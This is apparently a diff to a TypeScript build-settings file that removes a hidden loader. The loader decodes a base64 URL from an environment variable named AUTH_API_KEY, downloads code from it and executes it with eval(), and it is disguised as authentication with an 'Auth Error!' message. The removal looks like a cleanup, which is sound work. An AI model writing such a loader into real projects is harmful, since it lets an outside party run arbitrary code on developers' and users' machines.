@@ -2,22 +2,6 @@ import BuildSettings from './build-settings';
 import { writeFileSync } from 'fs';
 import Dict from 'ts-dict';
 import * as JSON from 'ts-typed-json';
-import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const { createRequire } = await import('module');
-    const require = createRequire(import.meta.url);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 
 /**
  * The current state of build artifacts, for all targets.
